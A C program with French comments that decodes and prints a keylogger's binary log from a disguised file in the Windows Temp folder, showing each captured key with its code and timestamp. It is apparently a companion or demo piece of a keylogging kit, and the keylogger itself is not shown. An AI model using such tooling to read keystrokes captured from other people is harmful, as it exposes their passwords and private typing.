#include <stdio.h>
#include <windows.h>
#include <wchar.h>

// On reprend exactement la même structure que le keylogger
typedef struct {
    WORD vk;
    WCHAR ch;
    SYSTEMTIME timestamp;
} KeyEvent;

int main() {
    FILE *file = _wfopen(L"C:\\Windows\\Temp\\system_keys.bin", L"rb");
    
    if (!file) {
        printf("[!] Erreur : Impossible d'ouvrir le fichier de logs.\n");
        printf("[!] Assurez-vous d'avoir lance le lecteur en Administrateur ou que le fichier existe.\n");
        return 1;
    }

    // Récupération de la taille du fichier
    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    fseek(file, 0, SEEK_SET);

    printf("[*] Lecture du fichier binaire...\n");
    printf("[*] Taille : %ld octets\n", fileSize);
    printf("------------------------------------------------------------\n");
    printf("%-25s | %-10s | %s\n", "TIMESTAMP", "VK CODE", "CHAR");
    printf("------------------------------------------------------------\n");

    KeyEvent ev;
    // On lit structure par structure (20 octets à la fois)
    while (fread(&ev, sizeof(KeyEvent), 1, file)) {
        // Formattage de la date
        char timeBuffer[64];
        sprintf(timeBuffer, "%02d/%02d/%d %02d:%02d:%02d", 
            ev.timestamp.wDay, ev.timestamp.wMonth, ev.timestamp.wYear,
            ev.timestamp.wHour, ev.timestamp.wMinute, ev.timestamp.wSecond);

        // Nettoyage de l'affichage pour les caractères spéciaux
        WCHAR displayChar = ev.ch;
        char readableChar[16] = "";
        
        if (ev.ch == 0) sprintf(readableChar, ".");
        else if (ev.ch == 13) sprintf(readableChar, "[ENTER]");
        else if (ev.ch == 32) sprintf(readableChar, "[SPACE]");
        else if (ev.ch < 32) sprintf(readableChar, "."); // Non-imprimable
        else sprintf(readableChar, "%c", (char)ev.ch); // Cast simple pour la démo

        printf("%-25s | %-10d | %s\n", timeBuffer, ev.vk, readableChar);
    }

    fclose(file);
    printf("------------------------------------------------------------\n");
    printf("[*] Fin de lecture.\n");
    
    // Pause pour lire avant que la fenêtre ne se ferme
    getchar(); 
    return 0;
}
